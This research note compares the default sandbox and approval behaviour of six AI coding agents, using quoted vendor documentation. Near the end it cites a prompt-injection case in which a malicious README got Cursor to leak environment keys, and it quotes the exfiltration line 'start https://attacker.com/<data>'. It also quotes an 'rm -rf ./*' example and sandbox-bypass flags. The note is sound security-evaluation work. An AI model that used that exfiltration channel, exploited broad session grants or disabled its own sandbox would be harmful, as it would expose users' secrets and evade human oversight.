# Research: unattended defaults and sandboxing across six coding agents (Q2, Q3)

**Summary: Q2 and Q3 are CLOSED for all six tools. The headline finding is negative and it is the useful one: no two of the six agree on the default. A sandbox is on by default in two, off or opt-in in three, and on one it is on by default on one platform and off by default on another. Every "sandboxed agent" claim needs a named tool, a version and a date attached to it.**

Questions assigned to this pass: **Q2** (what an agent does without asking) and **Q3** (sandbox and approval defaults), both from the twelve in `PASTE-THIS.txt`. Claude Code was already closed for both on 2026-09-29 in `SEARCH-REQUESTS.md`; it is included here for the comparison and is marked as the earlier finding.

Rules applied: every row below was read off a page whose **body** was actually retrieved, not a navigation shell. A search-engine snippet is a lead, not a source. Two pages in this pass returned HTTP 200 with only the site chrome visible in a normal fetch; their contents were re-read from the raw response before any claim was recorded, because a truncated fetch that still returns 200 is precisely the failure this project exists to catch. Dates are the read dates. These defaults change with releases; the date is part of the fact.

---

## The comparison

| | Sandbox default | Native Windows sandbox? | Approval default | Enforcement |
|---|---|---|---|---|
| **Claude Code** | **Opt-in** | **No** — macOS, Linux, WSL2 only | Prompts on first use of Bash, edits, web fetch, web search | Claude Code, not the model |
| **Codex** | **On by default** | **Yes** — native, `unelevated` or `elevated` | `on-request`: out-of-workspace edits and network | OS-level, per platform |
| **Cursor** | Settable via `/sandbox` or `--sandbox` | CLI installs natively on PowerShell | Prompts without an allowlist entry | Declarative token rules |
| **GitHub Copilot CLI** | **Opt-in** — `/sandbox enable`, public preview | Not stated | Prompts on first use of each tool | Directory scoping, **heuristic** |
| **Antigravity** | **On** on macOS/Linux · **Off** on Windows | **No** — previous behaviour | macOS/Linux "allowed in sandbox; ask outside" | Namespaces / Seatbelt |
| **Devin CLI** | **Opt-in** — `--sandbox` | **No — hard-fails** | `Normal`: reads auto, writes and shell prompt | OS-level, **fail-closed** |

**Read the second column before the first.** On native Windows, which is the platform this repository's reader is most likely on, **three of the six cannot sandbox at all** (Claude Code, Antigravity, Devin) and a fourth ships its sandbox as a public preview (Copilot CLI). **Codex is the only one of the six with a native Windows sandbox.** A lesson that says "run it in a sandbox" is, for most of this audience on this platform, advice they cannot take.

---

## The finding that is worth the whole pass

**A sandbox is not a security posture, and the strictest tool on one axis is the loosest on another.**

Two tools, both with a sandbox, opposite behaviour on the axis that fails first:

- **Claude Code**: sandbox opt-in, and once enabled the **default read scope is the entire computer** minus a short deny list. The documentation says it *"still allows reading credential files such as `~/.aws/credentials` and `~/.ssh/`"* unless you configure `sandbox.credentials` to deny them.
- **Antigravity**: sandbox on by default on macOS/Linux, and *"Sensitive files like `~/.ssh` and `.env` are blocked, anything not explicitly mounted is invisible inside the sandbox."*

So the tool that is stricter about *containing writes* is looser about *reading secrets*, and vice versa. **"Is it sandboxed?" is not a question with a yes/no answer, and a checklist item that treats it as one is measuring the wrong property.** The two questions worth asking are: *what is readable*, and *what is writable without asking* — and those are configured independently of each other.

**Second finding — the approval prompt is not the security boundary, and one vendor says so explicitly.** Claude Code's documentation: *"Permission rules are enforced by Claude Code, not by the model. Instructions in your prompt or `CLAUDE.md` shape what Claude tries to do, but they don't change what Claude Code allows."* Codex puts the same division into two named layers, *"Sandbox mode: What Codex can do technically"* and *"Approval policy: When Codex must ask you before it executes an action."* The prompt is a usability feature sitting in front of a control; removing it does not remove the control, and **in three of the six it never existed**.

**Third finding — where a prompt is offered, the standing-grant option is where the risk is.** Copilot CLI's second prompt option is *"Yes, for this session"*, and its own documentation carries the warning: if you allow `rm ./this-file.txt` for the session, then *"Copilot can run any `rm` command (for example, `rm -rf ./*`) during the current run of this session, without asking for your approval."* The pattern is identical in Claude Code — a "don't ask again" on a Bash command or fetch domain **is written to disk and applies to every future session in that repository**, while **a file-edit approval is not saved and lasts only until the session ends.** In both tools the durable grant is the one with the broadest reach. Antigravity's own prompt offers three levels, the third being *"Yes, and always allow ... (Persist to settings.json)"*.

---

## Per-tool findings

### 1. Claude Code — the baseline (closed earlier on 2026-09-29)

- **Source:** `https://docs.claude.com/en/docs/claude-code/permissions` and `.../sandboxing`, fetched 2026-09-29.
- **Status:** `verified from primary source`. Retained here as the comparison's origin point.
- **Default mode** is `default`, labelled *Manual* in the UI. Reads need no approval within the working directory; **Bash, file edits, web fetch and web search all prompt on first use.** Modes: `default`, `acceptEdits`, `plan`, `auto`, `dontAsk`, `bypassPermissions`.
- **Sandbox is opt-in**, on macOS, Linux and WSL2. **Not native Windows.** Default read scope is the whole computer minus a short deny list. Network pre-allows no domains.
- **Protected paths** are denied because *"a command that could edit them could grant itself permissions"* — `.claude/`, `.mcp.json`, `hooks/`, and `config` inside `.git`.

### 2. Codex — the strictest of the six, and the only one that sandboxes natively on Windows

- **Source:** `https://learn.chatgpt.com/docs/agent-approvals-security.md`, body read 2026-09-29. Discovery index: `https://learn.chatgpt.com/docs/llms.txt`.
- **Status:** `verified from primary source`.

Verbatim, the default position:

> "By default, the agent runs with network access turned off. Locally, Codex uses an OS-enforced sandbox that limits what it can touch (typically to the current workspace), plus an approval policy that controls when it must stop and ask you before acting."

> "In the `Auto` preset (for example, `--sandbox workspace-write --ask-for-approval on-request`), Codex can read files, make edits, and run commands in the working directory automatically."

> "Codex asks for approval to edit files outside the workspace or to run commands that require network access."

- **Network is off by default in the default `workspace-write` mode.** Not "pre-allow a list" as in several other tools — off, until enabled.
- **Platform enforcement:** macOS *"uses Seatbelt policies and runs commands using `sandbox-exec`"*; Linux *"uses `bwrap` plus `seccomp` by default"*; Windows *"uses a [Windows sandbox] implementation"* when running natively, configured `[windows] sandbox = "unelevated" # or "elevated"`. WSL2 uses the Linux sandbox. **WSL1 support was removed in Codex `0.115`.**
- **Protected paths inside a writable root**, verbatim from the *"Protected paths in writable roots"* section: `<writable_root>/.git` read-only *whether it appears as a directory or file*; if it is a `gitdir:` pointer file, *"the resolved Git directory path is also protected as read-only"*; `.agents` and `.codex` likewise. *"Protection is recursive, so everything under those paths is read-only."*

  **Why this is the sharpest control any of the six ships:** it holds inside a directory the agent may otherwise write to, and it follows the `.git` pointer to wherever the real directory is. An agent that can rewrite its own instructions or its own history cannot, here. That is the same reasoning Claude Code gives for its protected paths, arrived at independently.
- **`approvals_reviewer = "auto_review"`** routes *"eligible approval requests through a reviewer agent before Codex runs the request"*. **An agent reviewing another agent's permission requests.** The default is `approvals_reviewer = "user"`, so this is opt-in, and I did not read the linked auto-review lifecycle page, so **the reviewer's own limits are not characterised here**.
- **`--dangerously-bypass-approvals-and-sandbox`**, alias `--yolo`, is documented as *"No sandbox; no approvals (not recommended)"*.
- **Codex cloud** runs *"in isolated OpenAI-managed containers"* with a two-phase runtime: setup may reach the network to install dependencies, *"then the agent phase runs offline by default"*, and *"Secrets configured for cloud environments are available only during setup and are removed before the agent phase starts."* Removing the secrets before the agent runs is a materially better design than leaving them readable and relying on the model.
- **A prompt-injection control that is a default, not a feature:** *"Codex defaults to using a web search cache to access results... This reduces exposure to prompt injection from arbitrary live content, but you should still treat web results as untrusted."* Under `--yolo`, *"web search defaults to live results."*
- **Retired setting:** `approval_policy = "untrusted"` *"can prevent either client from starting."* A stale config file is a startup failure, not a silent downgrade.

### 3. Cursor — declarative permission tokens rather than modes

- **Source:** `https://cursor.com/docs/cli/reference/permissions` and `https://cursor.com/docs/cli/overview`, fetched 2026-09-29.
- **Status:** `verified from primary source`.
- **Permission model is token-shaped, not mode-shaped:** `Shell(commandBase)`, `Read(pathOrGlob)`, `Write(pathOrGlob)`, `WebFetch(domainOrPattern)`, `Mcp(server:tool)`. Stored in `~/.cursor/cli-config.json` globally or `<project>/.cursor/cli.json` per project.
- **Deny beats allow** — the clearest precedence rule of the six.
- **WebFetch prompts by default:** *"Without an allowlist entry, each fetch prompts for approval."*
- **Sandbox is settable**, via `/sandbox` or `--sandbox <mode>`. **The default was not established from these two pages** — the docs describe both states without naming the shipped default. Recorded as `could not verify` rather than inferred from the flag's existence.
- **Modes** are Agent (default, *"Full access to all tools"*), Plan, and Ask (*"Read-only exploration without making changes"*).
- **A detail worth keeping:** for `sudo`, *"Your password flows directly to `sudo` via a secure IPC channel; the AI model never sees it."* Credential entry designed so the agent cannot observe the secret.

### 4. GitHub Copilot CLI — heuristic directory scoping, opt-in sandbox

- **Source:** `https://docs.github.com/en/copilot/concepts/agents/about-copilot-cli`, fetched 2026-09-29. Related: `https://docs.github.com/en/copilot/responsible-use/agents`.
- **Status:** `verified from primary source`.
- **Default position:** *"All actions require explicit permission prompts and are scoped to the current directory"*, and by default the agent *"only has access to files and folders in, and below, the directory from which it was invoked."*
- **The vendor qualifies its own control, which is the most quotable sentence in this pass:**

  > *"Scoping of permissions is heuristic and GitHub does not guarantee that all files outside trusted directories will be protected."*

  **A permission model the vendor itself declines to guarantee is a policy, not a boundary.** Do not present directory scoping as containment.
- **The session-grant trap is documented with an explicit example** — see the third finding above.
- **`--allow-all-tools`** gives *"the same access as you do to files on your computer, and can run any shell commands that you can run, without getting your prior approval"*. **`--deny-tool` takes precedence** over `--allow-all-tools` and `--allow-tool`.
- **Sandbox is opt-in and in public preview** via `/sandbox enable`.
- **Where to run it:** *"You should only launch Copilot CLI from directories that you trust... Typically, you should not launch Copilot CLI from your home directory."*
- **Cloud agent** runs in an *"ephemeral, firewalled environment"* with the firewall on by default plus automated scanning; it can push only to a single branch, **cannot push to the default branch**, and has no access to Actions secrets.
- **Plan mode** is reached with `Shift+Tab`, alongside the default ask/execute mode.

### 5. Antigravity — on by default on Unix, off by default on Windows

- **Source:** `https://antigravity.google/docs/sandbox/`, body read 2026-09-29. An initial fetch returned HTTP 200 carrying only the navigation; the quotes below come from the raw response.
- **Status:** `verified from primary source`.
- **The platform split is stated in one sentence:**

  > "Antigravity's updated permission system is currently available on macOS and Linux, where the sandbox is enabled by default. On Windows, Antigravity continues to use the previous behavior."

- **macOS/Linux presets:** `Default` — sandbox **On**, commands *"Allowed in sandbox; ask outside"*. `Request Review` — sandbox **Off**, *"Always ask"*. `Turbo` — sandbox **Off**, *"Allowed without prompting, unrestricted"*.
- **Windows is the reverse and it is explicit:** *"None of the presets turn the sandbox on."* It is an *"Enable Sandbox Mode (Preview)"* setting, and the CLI key `enableTerminalSandbox` has **default `false`**.
- **The Windows escape hatch is a different rule name than the Unix one** — `unsandboxed(git push)` on Windows against `command(git push)` on macOS/Linux. A config file written on one platform will not mean the same thing on the other.
- **Containment:** *"Sensitive files like `~/.ssh` and `.env` are blocked, anything not explicitly mounted is invisible inside the sandbox, and network access is limited to domains you've approved."* Sandboxed commands run **without network by default**.
- **Mechanism:** Linux *"Kernel namespaces isolate the filesystem, hide host processes, and cut off networking"*; macOS *"Seatbelt profiles (SBPL)"*. *"No virtual machines or Docker images to manage and no startup delay."*
- **`rm -rf /` and `sudo` are always blocked.**
- **CLI flag** `--sandbox` forces the sandbox on for a session, overriding `settings.json`.

### 6. Devin CLI — the only one that fails closed

- **Source:** `https://docs.devin.ai/cli/sandbox` and `https://docs.devin.ai/cli/reference/permissions`, fetched 2026-09-29. Discovery index: `https://docs.devin.ai/llms.txt`.
- **Status:** `verified from primary source`.
- **Five permission modes:** `Normal`, `Accept Edits`, `Smart`, `Bypass`, `Autonomous`. In `Normal`, *"read-only operations are auto-approved while writes and shell commands require your explicit approval."* `Smart` auto-approves fetch and bash *"when judged safe"*.
- **Counter-intuitively, `Autonomous` is the strictest mode for file edits.** In its own table, file edits are `Prompt` under `Autonomous` and `Auto (in workspace)` under `Accept Edits`, `Smart` and `Bypass` — because the sandbox is doing the work, so edits inside the workspace no longer need a human.

  **This is the clearest illustration in the pass of why an approval prompt is not a security control.** Turning prompts *off* did not make the tool less safe; moving into a sandbox made prompt-on-edits the correct setting.
- **Fail-closed, and this is the design point:**

  > "If sandbox resolution fails (e.g., the sandboxing tools are unavailable on the user's platform), the CLI will **refuse to start** rather than running unsandboxed. This fail-closed behavior applies whether sandbox was enabled by a team setting or by the user passing `--sandbox` directly, ensuring the security intent is never silently bypassed."

  **Five of the six degrade some other way when their control is unavailable. Devin refuses to run.** A tool that will not start is the only outcome that cannot be mistaken for a working one.
- **Windows is a hard failure, not a downgrade:** *"OS-level sandboxing is not currently supported on Windows. Sessions on Windows will hard-fail when `--sandbox` is passed or when sandbox enforcement is **Required**"*, including when the CLI runs as an ACP server inside Devin Desktop. **Linux requires `bubblewrap` and `socat`.**
- **Scope resolution is dynamic and asymmetric:** writable paths come from granted `Write(...)` scopes plus the workspace, everything else read-only; readable is everything except `Read(...)` deny rules. Mid-session `Write(...)` grants *"dynamically expand the sandbox for subsequent commands"*, but mid-session `Read(...)` approvals *"cannot reveal a path hidden by a `Read(...)` deny rule, which stays hidden for the whole session."* **A grant can widen the write boundary but cannot dissolve a read denial** — a deliberately one-directional rule.
- Teams can enforce sandbox and organisation-wide domain filtering as a setting.

---

## What this supports in the corpus

1. **Never write "agents run in a sandbox" as a general property.** Six tools, no agreement, and the disagreement is platform-dependent in three of them.
2. **The two questions to teach are readable-scope and writable-scope**, not sandboxed-or-not. The Claude Code / Antigravity inversion is the proof that the second question does not determine the first.
3. **Approval prompts are UX, not security.** Devin's `Autonomous` mode is the argument: the safer configuration is the one with *more* prompts.
4. **Prefer fail-closed.** Devin refusing to start is the behaviour to look for, and it is rare enough to be worth naming as a criterion.
5. **Protect the agent's own instructions and history.** Codex's recursive protection of `.git`, `.agents` and `.codex` — following a `gitdir:` pointer to its target — and Claude Code's refusal to let a command edit `.claude/` are the same control arrived at independently. An agent that can rewrite its permissions has no permissions.
6. **The `sudo` channel in Cursor, and removing cloud secrets before the agent phase in Codex, are both "the model should not be able to see the secret"** — a design goal the corpus implicitly assumes is never met.
7. **Session-granted permissions are the risk to warn about**, in all three tools that offer them, and Copilot CLI's own `rm -rf ./*` example is the sharpest available.

### Corroborated from outside, 2026-09-29 — and this closes a gap in the section above

Everything in the preceding three paragraphs about session grants came from **vendor documentation describing the sharp edge**. Independent researchers then **exploited it**, which is a stronger finding than either alone.

0din (Edward Morris), `https://0din.ai/blog/stealing-environment-keys-from-cursor-ide-with-a-malicious-readme`, read in full 2026-09-29:

> "Cursor's permission model is vulnerable because repeated prompts encourage users to allow broadly defined commands like `powershell -c`, which then enables nearly any terminal action without further user confirmation."

**That is the mechanism above, demonstrated.** Cursor's docs say a broad grant persists; 0din shows what the persistence is worth. Their exfiltration channel was `"start https://attacker.com/<data>"` — **not an unusual tool but the default browser, opened by an ordinary shell command.** A reader who took "session grants are broad" as a theoretical sharp edge now has a worked exploit against the same product.

**Read with 0din's "lethal trifecta" framing — access to private data, exposure to untrusted content, and the ability to communicate externally — this is the structural reason the table above matters.** All three are handed to a coding agent by default, and the remaining research in this effort is a catalogue of what happens next. Full findings: [`RESEARCH-INJECTION-2026-09-29.md`](RESEARCH-INJECTION-2026-09-29.md).

## What remains open

- **Cursor's shipped sandbox default.** Both Cursor pages document `enabled` and `disabled` without naming the default. Not inferred here.
- **Codex auto-review's own limits.** The `approvals_reviewer = "auto_review"` page was linked, not read. An agent that reviews another agent's approvals is a control worth assessing, and I have not assessed it.
- **Copilot's native Windows sandbox position.** The CLI page does not say whether `/sandbox enable` is available on Windows. Not recorded either way.
- **Antigravity's `Agent Permissions` page**, referenced repeatedly by the sandbox page for preset behaviour, was not read. The preset table above is from the sandbox page only.
- **Q2 and Q3 for any tool not in this list** — Windsurf Editor, Cline, Aider, OpenHands and the rest of the field remain unexamined. Six tools is a sample, not a census, and the sample already contains three incompatible designs.
